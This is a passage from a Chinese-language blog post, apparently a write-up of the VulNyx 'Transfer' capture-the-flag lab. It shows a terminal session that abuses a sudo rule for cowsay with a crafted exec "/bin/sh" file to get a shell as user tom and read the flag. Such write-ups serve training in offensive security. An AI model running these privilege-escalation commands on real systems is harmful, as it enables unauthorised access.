class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">www-data@transfer:/tmp$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on transfer:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on transfer:</span><br><span class="line">    (tom) NOPASSWD: /usr/games/cowsay</span><br><span class="line">www-data@transfer:/tmp$ </span><br><span class="line">www-data@transfer:/tmp$ <span class="built_in">ls</span> -al</span><br><span class="line">total 3884</span><br><span class="line">drwxrwxrwt  2 root     root        4096 Sep 12 12:50 .</span><br><span class="line">drwxr-xr-x 18 root     root        4096 Mar 24  2021 ..</span><br><span class="line">-rwxrwxrwx  1 www-data www-data  860549 Mar 28 10:00 linpeas.sh</span><br><span class="line">-rwxrwxrwx  1 www-data www-data 3104768 Mar 28 10:20 pspy64</span><br><span class="line">www-data@transfer:/tmp$ </span><br><span class="line">www-data@transfer:/tmp$ TF=$(<span class="built_in">mktemp</span>)</span><br><span class="line">www-data@transfer:/tmp$ </span><br><span class="line">www-data@transfer:/tmp$ <span class="built_in">ls</span> -al</span><br><span class="line">total 3884</span><br><span class="line">drwxrwxrwt  2 root     root        4096 Sep 12 12:50 .</span><br><span class="line">drwxr-xr-x 18 root     root        4096 Mar 24  2021 ..</span><br><span class="line">-rwxrwxrwx  1 www-data www-data  860549 Mar 28 10:00 linpeas.sh</span><br><span class="line">-rwxrwxrwx  1 www-data www-data 3104768 Mar 28 10:20 pspy64</span><br><span class="line">-rw-------  1 www-data www-data       0 Sep 12 12:50 tmp.CSFeR0WWMP</span><br><span class="line">www-data@transfer:/tmp$ </span><br><span class="line">www-data@transfer:/tmp$ <span class="built_in">echo</span> <span class="string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span> &gt; <span class="variable">$TF</span></span><br><span class="line">www-data@transfer:/tmp$ </span><br><span class="line">www-data@transfer:/tmp$ <span class="built_in">cat</span> <span class="variable">$TF</span></span><br><span class="line"><span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">www-data@transfer:/tmp$ </span><br><span class="line">www-data@transfer:/tmp$ sudo -u tom /usr/games/cowsay -f <span class="variable">$TF</span> x</span><br><span class="line"> ___</span><br><span class="line">&lt; x &gt;</span><br><span class="line"> ---</span><br><span class="line">www-data@transfer:/tmp$ <span class="built_in">chmod</span> +rw <span class="variable">$TF</span></span><br><span class="line">www-data@transfer:/tmp$ </span><br><span class="line">www-data@transfer:/tmp$ <span class="built_in">ls</span> -al</span><br><span class="line">total 3888</span><br><span class="line">drwxrwxrwt  2 root     root        4096 Sep 12 12:50 .</span><br><span class="line">drwxr-xr-x 18 root     root        4096 Mar 24  2021 ..</span><br><span class="line">-rwxrwxrwx  1 www-data www-data  860549 Mar 28 10:00 linpeas.sh</span><br><span class="line">-rwxrwxrwx  1 www-data www-data 3104768 Mar 28 10:20 pspy64</span><br><span class="line">-rw-rw-rw-  1 www-data www-data      16 Sep 12 12:50 tmp.CSFeR0WWMP</span><br><span class="line">www-data@transfer:/tmp$ </span><br><span class="line">www-data@transfer:/tmp$ sudo -u tom /usr/games/cowsay -f <span class="variable">$TF</span> x</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1000(tom) gid=1000(tom) <span class="built_in">groups</span>=1000(tom)</span><br><span class="line">$ </span><br><span class="line">$ <span class="built_in">ls</span> -al</span><br><span class="line">total 3888</span><br><span class="line">drwxrwxrwt  2 root     root        4096 Sep 12 12:50 .</span><br><span class="line">drwxr-xr-x 18 root     root        4096 Mar 24  2021 ..</span><br><span class="line">-rwxrwxrwx  1 www-data www-data  860549 Mar 28 10:00 linpeas.sh</span><br><span class="line">-rwxrwxrwx  1 www-data www-data 3104768 Mar 28 10:20 pspy64</span><br><span class="line">-rw-rw-rw-  1 www-data www-data      16 Sep 12 12:50 tmp.CSFeR0WWMP</span><br><span class="line">$ </span><br><span class="line">$ <span class="built_in">cd</span> ~</span><br><span class="line">$ </span><br><span class="line">$ <span class="built_in">ls</span> -al</span><br><span class="line">total 28</span><br><span class="line">drwx------ 3 tom  tom  4096 May 23  2023 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Mar 24  2021 ..</span><br><span class="line">lrwxrwxrwx 1 root root    9 May 23  2023 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 tom  tom   220 Mar 24  2021 .bash_logout</span><br><span class="line">-rw-r--r-- 1 tom  tom  3526 May 23  2023 .bashrc</span><br><span class="line">drwxr-xr-x 3 tom  tom  4096 Mar 24  2021 .<span class="built_in">local</span></span><br><span class="line">-rw-r--r-- 1 tom  tom   807 Mar 24  2021 .profile</span><br><span class="line">-r-------- 1 tom  tom    33 May 23  2023 user.txt</span><br><span class="line">$ </span><br><span class="line">$ <span class="built_in">cat</span> user.txt</span><br><span class="line">806f06c84d90fbd5c0e08b2b3f108ec7</span><br><span class="line">$ </span><br></pre></td></tr></table></figure>
+<p>获得 tom 权限，读得 user.txt</p>
+<h2 id="参考">4. 参考</h2>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://0x-noname.github.io/writeups/nyx/transfer/">VulNyx
+- Transfer | noname</a><br />
+</li>
+<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1r1pRegE6R/">vulnyx
+Transfer靶场复盘_哔哩哔哩_bilibili</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Phantom
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://z9m8r8.github.io/2024/09/12/VulNyx%20-%20Transfer/" title="VulNyx - Transfer">https://z9m8r8.github.io/2024/09/12/VulNyx - Transfer/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"><i class="fa fa-tag"></i> 信息收集</a>
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
+              <a href="/tags/%E5%8F%8D%E5%BC%B9-shell/" rel="tag"><i class="fa fa-tag"></i> 反弹 shell</a>
+              <a href="/tags/RCE/" rel="tag"><i class="fa fa-tag"></i> RCE</a>
+              <a href="/tags/Fuzzing/" rel="tag"><i class="fa fa-tag"></i> Fuzzing</a>
+              <a href="/tags/VulNyx/" rel="tag"><i class="fa fa-tag"></i> VulNyx</a>
+              <a href="/tags/disable-functions/" rel="tag"><i class="fa fa-tag"></i> disable_functions</a>
+              <a href="/tags/DNS/" rel="tag"><i class="fa fa-tag"></i> DNS</a>
+              <a href="/tags/SSRF/" rel="tag"><i class="fa fa-tag"></i> SSRF</a>
+              <a href="/tags/cowsay-%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> cowsay 提权</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/09/06/VulNyx%20-%20Key/" rel="prev" title="VulNyx - Key">
+                  <i class="fa fa-angle-left"></i> VulNyx - Key
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/09/19/Kioptrix%20Level%201.1/" rel="next" title="Kioptrix: Level 1.1">
+                  Kioptrix: Level 1.1 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Phantom</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">294k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">17:50</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2024/09/12/VulNyx%20-%20Transfer/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
